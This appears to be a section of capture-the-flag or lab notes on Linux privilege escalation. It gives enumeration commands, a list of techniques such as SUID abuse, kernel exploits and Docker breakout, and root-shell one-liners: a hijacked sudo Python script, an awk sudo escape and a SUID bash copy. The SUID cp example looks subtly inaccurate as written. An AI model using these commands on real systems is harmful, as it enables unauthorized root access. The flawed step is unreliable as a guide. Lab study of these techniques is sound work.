## 🛡️ Privilege Escalation (Machines 91–100)

```bash
# Common Enumeration
sudo -l                                 # Check sudo permissions
find / -perm -4000 -type f 2>/dev/null  # Find SUID binaries
getcap -r / 2>/dev/null                 # Check Linux capabilities
ps aux | grep root                      # Check running root processes
ls -la /home/*                          # Look for user data and SSH keys
```

### Techniques Observed

- **Writable scripts with sudo permissions** (e.g., Python, Bash, and custom scripts).
- **Misconfigured SUID binaries** allowing escalation to root (e.g., `vim`, `nmap`, `cp`, `find`).
- **Credential reuse** from exposed databases or web applications used for SSH access.
- **Weak file permissions** (e.g., user readable `/etc/shadow`, log files in `/var/log`).
- **Kernel exploits** such as DirtyCow or OverlayFS on outdated kernels.
- **Docker breakout** and capabilities abuse in containers.
- **Sudoers misconfigurations**: NOPASSWD entries for dangerous binaries.
- **Exposed backup scripts** allowing command injection or unsafe execution.
- **LD_PRELOAD / PATH hijack**: Exploiting environment variables in scripts run as root.

### Exploitation Examples

```bash
# Exploit writable Python script with sudo
echo 'import os; os.system("/bin/bash")' > /opt/run.py
sudo /usr/bin/python3 /opt/run.py

# Sudo abuse: Awk shell escape
sudo awk 'BEGIN {system("/bin/sh")}'

# Exploit SUID binary (e.g., cp)
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p
```

### Tools Used

```bash
linpeas.sh                # Comprehensive local enumeration
linux-exploit-suggester   # Suggest kernel/privilege escalation exploits
pspy64                    # Monitor running processes for privilege abuse
```
